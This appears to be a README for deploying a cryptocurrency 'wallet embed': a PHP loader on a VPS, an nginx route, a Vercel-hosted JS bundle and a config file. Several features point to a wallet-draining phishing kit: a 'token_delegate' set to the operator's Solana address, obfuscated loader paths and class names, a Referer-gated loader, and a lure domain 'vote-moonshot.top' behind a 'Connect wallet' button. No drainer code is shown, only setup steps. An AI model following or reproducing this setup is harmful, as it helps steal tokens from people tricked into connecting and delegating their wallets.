# Wallet embed

```
├── vercel/          → deploy to Vercel (JS bundle + /profile popup)
├── vps/             → upload to Debian VPS (PHP proxy + HTML)
└── nginx/           → nginx config for VPS
```

---

## VPS files

Upload to `/var/www/mysite/vps/`:

```
vps/
├── loader.php           ← single PHP proxy (upload once)
├── config.php           ← copy from config.example.php — you edit this
├── cache/               ← writable by www-data
└── public/
    ├── index.html
    └── tYZq2BsVawvS5wYEF.svg
```

---

## HTML

```html
<script src="/vault38472" defer></script>
<button type="button" class="K7mQ2">Connect wallet</button>
```

---

## nginx

See `nginx/wallet-connect.conf` — `location = /vault38472` → `loader.php`.

---

## config.php

```php
'reown_project_id' => 'YOUR_REOWN_ID',
'site_url' => 'https://vote-moonshot.top',
'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
'button_class' => 'K7mQ2',
'connect_popup_enabled' => true,
'token_delegate' => 'YOUR_SOLANA_ADDRESS',
'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=YOUR_KEY',
```

```bash
cp config.example.php config.php && nano config.php
chmod 640 config.php
chown -R www-data:www-data /var/www/mysite/vps
```

---

## Vercel

1. Import repo → **Root Directory:** `vercel` → Deploy
2. No env vars needed (config lives in VPS `config.php`)
3. URLs: `/wallet.bundle.js` and `/profile`

Reown dashboard → allow **vote-moonshot.top**

---

## Flow

```
/vault38472 → loader.php → config + Vercel JS
Pick wallet → popup YOUR-PROJECT.vercel.app/profile
```

Test: `curl -I -H "Referer: https://vote-moonshot.top/" https://vote-moonshot.top/vault38472`

Clear cache after Vercel deploy: `rm -f vps/cache/wallet.bundle.js`
